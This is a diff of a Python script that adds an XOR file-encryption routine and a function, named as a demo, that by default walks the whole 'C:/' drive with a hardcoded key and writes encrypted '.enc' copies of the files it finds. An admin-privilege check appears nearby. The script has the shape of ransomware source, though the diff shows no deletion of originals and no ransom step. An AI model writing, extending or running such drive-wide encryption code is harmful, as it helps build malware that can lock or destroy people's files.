@@ -30,6 +30,14 @@ def is_admin():
 
 import os
 
+def xor_encrypt_file(src, dst, key):
+    with open(src, "rb") as f:
+        data = f.read()
+    key_bytes = key.encode()
+    encrypted = bytearray([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
+    with open(dst, "wb") as f:
+        f.write(encrypted)
+
 def encrypt_demo_folder(key_str="PAFF", root="C:/"):
     enc_dir = os.path.join(root, "encrypted")
     os.makedirs(enc_dir, exist_ok=True)
@@ -42,7 +50,7 @@ def encrypt_demo_folder(key_str="PAFF", root="C:/"):
                 os.makedirs(dst_folder, exist_ok=True)
                 dst = os.path.join(dst_folder, name + ".enc")
                 
-                xor_encrypt_file(src, dst, key_str)  # <-- indentation fix
+                xor_encrypt_file(src, dst, key_str)
             except PermissionError:
                 print(f"[ERREUR] Pas d'accès à {src}")
 
